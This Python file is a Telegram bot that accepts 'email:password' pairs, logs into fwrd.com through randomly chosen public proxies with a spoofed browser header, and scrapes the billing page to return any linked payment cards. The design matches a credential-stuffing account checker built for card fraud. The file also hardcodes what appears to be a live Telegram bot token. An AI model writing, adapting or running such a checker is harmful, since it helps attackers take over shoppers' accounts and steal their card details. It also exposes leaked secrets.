import requests
from bs4 import BeautifulSoup
from telegram import Update, Bot
from telegram.ext import CommandHandler, CallbackContext, Updater
import random

# Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual bot token
TELEGRAM_BOT_TOKEN = '7297098002:AAGaCltHCKy-9PCZEiBDeyKW7nm4lw0oT6U'

def get_proxies():
    response = requests.get('https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc')
    proxies = response.json().get('data', [])
    return [{'http': f"http://{proxy['ip']}:{proxy['port']}", 'https': f"https://{proxy['ip']}:{proxy['port']}"} for proxy in proxies]

def start(update: Update, context: CallbackContext) -> None:
    update.message.reply_text('Welcome! Please provide your email and password in the format: /login email:password')

def login(update: Update, context: CallbackContext) -> None:
    if len(context.args) != 1:
        update.message.reply_text('Please provide your email and password in the format: email:password')
        return

    email, password = context.args[0].split(':')
    session = requests.Session()

    # Get a random proxy
    proxies = get_proxies()
    proxy = random.choice(proxies)

    # Set headers to mimic a browser
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
    }

    # Login to fwrd.com
    login_url = 'https://www.fwrd.com/fw/mobile/Login.jsp'
    payload = {
        'email': email,
        'password': password
    }
    
    try:
        session.post(login_url, data=payload, headers=headers, proxies=proxy)
        # Check linked cards
        billing_info_url = 'https://www.fwrd.com/fw/mobile/BillingInfo.jsp'
        response = session.get(billing_info_url, headers=headers, proxies=proxy)
        soup = BeautifulSoup(response.text, 'html.parser')

        # Extract card information (this will depend on the actual HTML structure)
        cards = soup.find_all('div', class_='card-info')  # Adjust class name as necessary
        if cards:
            card_info = '\n'.join([card.get_text() for card in cards])
            update.message.reply_text(f'Linked Cards:\n{card_info}')
        else:
            update.message.reply_text('No linked cards found or login failed.')
    except requests.exceptions.ProxyError as e:
        update.message.reply_text(f'Proxy error occurred: {e}')

def main() -> None:
    updater = Updater(TELEGRAM_BOT_TOKEN)
    dispatcher = updater.dispatcher

    dispatcher.add_handler(CommandHandler('start', start))
    dispatcher.add_handler(CommandHandler('login', login))

    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()